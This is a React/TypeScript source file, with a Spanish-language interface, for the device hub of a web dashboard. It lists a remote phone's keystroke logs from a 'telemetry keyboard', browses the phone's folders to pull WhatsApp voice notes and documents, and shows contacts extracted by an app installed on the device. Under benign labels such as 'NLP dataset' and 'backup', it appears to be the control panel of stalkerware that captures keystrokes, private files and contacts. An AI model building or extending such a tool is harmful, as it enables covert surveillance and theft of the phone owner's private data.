'use client';

import React, { useState, useEffect } from 'react';

interface DeviceModuleHubProps {
  deviceId: string;
  onSelectModule: (view: 'nlp' | 'files' | 'contacts') => void;
  onBack: () => void;
}

export const DeviceModuleHub: React.FC<DeviceModuleHubProps> = ({
  deviceId,
  onSelectModule,
  onBack
}) => {
  const [deviceInfo, setDeviceInfo] = useState<{
    model?: string;
    android_version?: string;
    last_seen?: string;
    total_files?: number;
  }>({});

  const [contactBackupStatus, setContactBackupStatus] = useState<{
    status: 'loading' | 'not_installed' | 'syncing' | 'ready';
    contactCount?: number;
    lastBackupTime?: string;
    message?: string;
  }>({ status: 'loading' });

  useEffect(() => {
    fetch(`/api/telemetry/pending-downloads?deviceId=${encodeURIComponent(deviceId)}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.device_info) {
          setDeviceInfo(data.device_info);
        }
      })
      .catch(() => {});

    // Check contact backup status
    fetch(`/api/telemetry/devices/${encodeURIComponent(deviceId)}/contacts`)
      .then((res) => res.json())
      .then((data) => {
        if (data.success && Array.isArray(data.contacts)) {
          setContactBackupStatus({
            status: 'ready',
            contactCount: data.contactCount || data.contacts.length,
            lastBackupTime: data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Reciente'
          });
        } else {
          setContactBackupStatus({
            status: 'not_installed',
            message: 'La aplicación de respaldo no se ha instalado ni abierto en el dispositivo.'
          });
        }
      })
      .catch(() => {
        setContactBackupStatus({
          status: 'not_installed',
          message: 'La aplicación de respaldo no se ha instalado ni abierto en el dispositivo.'
        });
      });
  }, [deviceId]);

  return (
    <div className="w-full max-w-6xl mx-auto p-6">
      {/* Header with Back Button */}
      <div className="flex items-center justify-between mb-8 pb-4 border-b border-gray-200">
        <div>
          <button
            onClick={onBack}
            className="text-sm font-medium text-blue-600 hover:text-blue-800 flex items-center gap-1 mb-2"
          >
            &larr; Volver al Listado de Dispositivos
          </button>
          <h1 className="text-2xl font-bold text-gray-900">Hub de Selección de Módulo</h1>
          <p className="text-sm text-gray-500">
            Dispositivo Identificador: <span className="font-mono font-semibold text-gray-700">{deviceId}</span>
          </p>
        </div>
        <div className="text-right">
          <span className="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-green-100 text-green-800">
            Dispositivo Conectado
          </span>
        </div>
      </div>

      {/* Grid of 3 Modules */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        {/* Module 1: Dataset NLP */}
        <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-sm hover:shadow-md transition-shadow flex flex-col justify-between">
          <div>
            <div className="w-12 h-12 rounded-xl bg-blue-50 flex items-center justify-center text-blue-600 font-bold text-xl mb-4">
              NLP
            </div>
            <h2 className="text-xl font-bold text-gray-900 mb-2">Explorador Dataset NLP</h2>
            <p className="text-sm text-gray-600 mb-6 leading-relaxed">
              Accede a los registros de texto y pulsaciones capturados por el teclado de telemetría. Analiza secuencias de lenguaje humano y estructuras de pulsaciones.
            </p>
            <div className="bg-gray-50 rounded-xl p-4 mb-6">
              <div className="text-xs text-gray-500 font-medium uppercase mb-1">Módulo Activo</div>
              <div className="text-lg font-semibold text-gray-800">Registros de Teclado</div>
            </div>
          </div>
          <button
            onClick={() => onSelectModule('nlp')}
            className="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-xl transition-colors text-center shadow-sm"
          >
            Abrir Explorador Dataset NLP
          </button>
        </div>

        {/* Module 2: File Explorer */}
        <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-sm hover:shadow-md transition-shadow flex flex-col justify-between">
          <div>
            <div className="w-12 h-12 rounded-xl bg-emerald-50 flex items-center justify-center text-emerald-600 font-bold text-xl mb-4">
              DOC
            </div>
            <h2 className="text-xl font-bold text-gray-900 mb-2">Explorador de Archivos</h2>
            <p className="text-sm text-gray-600 mb-6 leading-relaxed">
              Explora el árbol de carpetas del dispositivo remoto. Selecciona notas de voz de WhatsApp (.opus), audios y documentos para sincronizar y reproducir en la web.
            </p>
            <div className="bg-gray-50 rounded-xl p-4 mb-6">
              <div className="text-xs text-gray-500 font-medium uppercase mb-1">Sincronización Secuencial</div>
              <div className="text-lg font-semibold text-gray-800">Archivos, Audios &amp; Opus</div>
            </div>
          </div>
          <button
            onClick={() => onSelectModule('files')}
            className="w-full py-3 px-4 bg-emerald-600 hover:bg-emerald-700 text-white font-medium rounded-xl transition-colors text-center shadow-sm"
          >
            Abrir Explorador de Archivos
          </button>
        </div>

        {/* Module 3: Contacts Explorer (Dynamic State Card) */}
        <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-sm hover:shadow-md transition-shadow flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-4">
              <div className="w-12 h-12 rounded-xl bg-purple-50 flex items-center justify-center text-purple-600 font-bold text-xl">
                TEL
              </div>
              {contactBackupStatus.status === 'ready' && (
                <span className="text-xs font-semibold px-2.5 py-1 bg-emerald-100 text-emerald-800 rounded-full">
                  Respaldo Listo
                </span>
              )}
              {contactBackupStatus.status === 'syncing' && (
                <span className="text-xs font-semibold px-2.5 py-1 bg-blue-100 text-blue-800 rounded-full animate-pulse">
                  Sincronizando...
                </span>
              )}
              {contactBackupStatus.status === 'not_installed' && (
                <span className="text-xs font-semibold px-2.5 py-1 bg-amber-100 text-amber-800 rounded-full">
                  Sin Respaldo
                </span>
              )}
            </div>

            <h2 className="text-xl font-bold text-gray-900 mb-2">Libreta de Contactos</h2>

            {contactBackupStatus.status === 'ready' && (
              <p className="text-sm text-gray-600 mb-6 leading-relaxed">
                Copia de respaldo disponible con {contactBackupStatus.contactCount} contactos serializados. Puedes consultar la tabla y buscar en tiempo real.
              </p>
            )}

            {contactBackupStatus.status === 'syncing' && (
              <p className="text-sm text-blue-600 mb-6 leading-relaxed font-medium">
                La aplicación ha iniciado la extracción y está enviando el paquete JSON al servidor.
              </p>
            )}

            {contactBackupStatus.status === 'not_installed' && (
              <p className="text-sm text-amber-700 mb-6 leading-relaxed bg-amber-50 p-3 rounded-xl border border-amber-200">
                La aplicación de libreta de contactos aún no ha sido instalada o abierta en este teléfono.
              </p>
            )}

            <div className="bg-gray-50 rounded-xl p-4 mb-6">
              <div className="text-xs text-gray-500 font-medium uppercase mb-1">Estado del Servicio</div>
              <div className="text-base font-semibold text-gray-800">
                {contactBackupStatus.status === 'ready'
                  ? `${contactBackupStatus.contactCount} Contactos | ${contactBackupStatus.lastBackupTime}`
                  : contactBackupStatus.status === 'syncing'
                  ? 'Obteniendo JSON de contactos...'
                  : 'Pendiente de instalación / primer inicio'}
              </div>
            </div>
          </div>

          <button
            onClick={() => onSelectModule('contacts')}
            className={`w-full py-3 px-4 font-medium rounded-xl transition-colors text-center shadow-sm ${
              contactBackupStatus.status === 'ready'
                ? 'bg-purple-600 hover:bg-purple-700 text-white'
                : 'bg-purple-600 hover:bg-purple-700 text-white'
            }`}
          >
            {contactBackupStatus.status === 'ready'
              ? 'Abrir Libreta de Contactos \u2192'
              : 'Ver Estado / Abrir Módulo \u2192'}
          </button>
        </div>
      </div>
    </div>
  );
};
